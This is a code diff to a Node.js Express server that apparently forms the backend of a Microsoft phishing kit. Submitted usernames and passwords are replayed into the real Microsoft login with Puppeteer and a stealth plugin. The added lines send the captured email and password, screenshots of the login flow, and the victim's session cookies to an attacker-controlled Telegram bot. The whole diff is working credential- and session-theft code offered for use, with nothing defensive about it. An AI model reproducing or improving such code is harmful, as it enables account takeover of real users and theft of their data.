@@ -12,6 +12,8 @@ const app = express();
 
 app.use(cors());
 
+
+
 // add stealth plugin and use defaults (all evasion techniques)
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
 puppeteer.use(StealthPlugin())
@@ -28,6 +30,10 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
 app.post('/login', async (req, res) => {
+
+  if (res.headersSent) {
+    return; // Exit the function if headers have been sent
+  }
 
   console.log("Loading Server")
   const { username, password } = req.body;  
@@ -164,9 +170,35 @@ app.post('/login', async (req, res) => {
       // });
     }
 
-    await page.waitForTimeout(3000)
+    await page.waitForTimeout(2000)
   
-    await page.type('input[name="passwd"]', password);
+    // await page.type('input[name="passwd"]', password);
+    async function typePassword(page, password) {
+      try {
+        console.log(password)
+        await page.type('input[name="passwd"]', password);
+      } catch {
+        await page.click('#idA_PWD_SwitchToPassword');
+    await page.waitForTimeout(2000)
+        await page.type('input[name="passwd"]', password);
+      }
+    }
+
+    typePassword(page, password);
+
+    await page.screenshot({ path: 'shots.png', fullPage: true })
+
+    const imagePat = 'shots.png';
+  
+    // Send the image
+    bot.sendPhoto(chatId, imagePat)
+          .then(() => {
+            // console.log('Image sent successfully');
+          })
+          .catch((error) => {
+            console.error('Error sending image:', error);
+    }); 
+
 
     await page.click('#idSIButton9');
 
@@ -189,28 +221,120 @@ app.post('/login', async (req, res) => {
       console.log('invalid Password')
     } else {
     res.json({ dataMsg: 'true' });
+    bot.sendMessage(chatId, `ACCOUNT MICROSOFT LOGIN - EMAIL:- ${username} , PASSWORD:- ${password}`)
+    .then(() => {
+      // console.log('Message sent successfully');
+    })
+    .catch((error) => {
+      // console.error('Error sending message:', error);
+    });
       console.log('Valid Password')
     }
 
 
-    await page.click('#idSIButton9');
+    async function clickButton(page) {
+      const button = await page.$('#idSIButton9');
+      if (button) {
+        await button.click();
+      } else {
+        console.log('Button not found');
+      }
+    }
+    try {  
+      await clickButton(page);
+    } catch (error) {
+      await page.screenshot({ path: 'shots.png', fullPage: true })
 
+      const imagePa = 'shots.png';
+    
+      // Send the image
+      bot.sendPhoto(chatId, imagePa)
+            .then(() => {
+              // console.log('Image sent successfully');
+            })
+            .catch((error) => {
+              console.error('Error sending image:', error);
+      });
+      console.error('Error occurred while clicking the button:');
+      // return
+    }
+
+
+
+  const element = await page.$('#idDiv_SAOTCS_Title'); // returns null if element is not found
+
+  if (element) {
+    
+    // const text = `Email ${username}`;
+    // const element = await page.$x(`//*[contains(text(), "${text}")]`);
+  
+    // if (element.length > 0) {
+    //   await element[0].click();
+    //   console.log(`Clicked on the element containing "${text}".`);
+    //   res.json({ collectCode: 'false' });
+
+    // } else {
+    //   console.log(`No element containing "${text}" found on the page.`);
+    // }
+
+    await page.waitForTimeout(3000)
+    
+    await page.screenshot({ path: 'shots.png', fullPage: true })
+
+    const imagePa = 'shots.png';
+  
+    // Send the image
+    bot.sendPhoto(chatId, imagePa)
+          .then(() => {
+            // console.log('Image sent successfully');
+          })
+          .catch((error) => {
+            console.error('Error sending image:', error);
+    }); 
+
+    return
+  } else {
+    console.log('Element does not exist!');
+  }
+
+    await page.waitForTimeout(4000)
 
     try {
       await Promise.all([
         page.waitForNavigation(), // Wait for navigation to complete
         // page.click('#myButton') // Replace with the selector of the button or element that triggers navigation
       ]);
-
     console.log('Page navigation is complete');
-    return
     // Continue with further actions or logic here
   } catch (error) {
     console.log('Page did not navigate');
+    // return
     // Continue with further actions or logic when navigation does not occur
   }
+  await page.waitForTimeout(5000)
 
-    await page.waitForTimeout(4000)
+  const cookies = await page.cookies();
+
+  const cook = JSON.stringify(cookies)
+    // Write cookies to a text file
+  fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
+  if (err) throw err;
+
+  // Read the .txt file
+const filePath = 'cookies.txt';
+// Create a readable stream from the file
+const fileStream = fs.createReadStream(filePath);
+
+// Send the .txt file as a document
+bot.sendDocument(chatId, fileStream)
+  .then(() => {
+    console.log('File sent successfully');
+  })
+  .catch((error) => {
+    console.error('Error sending file:', error);
+  });
+  // console.log('Cookies saved to cookies.txt');
+  });
 
     await page.screenshot({ path: 'shots.png', fullPage: true })
 
@@ -223,25 +347,19 @@ app.post('/login', async (req, res) => {
           })
           .catch((error) => {
             console.error('Error sending image:', error);
-          });
-
-})
+    }); 
+  })
 
 
 // END OF PUPPETEER SESSION
 })
 
 
-const port = 3000
+const port = 3006;
+
 // app.get('/', (req, res) => {
 //   res.send('Hello, World!');
 // });
-
-
-app.get('/', (req, res) => {
-  res.send('Hello World!')
-})
-
 
 app.listen(port, () => {
   console.log(`Server running at http://localhost:${port}`);
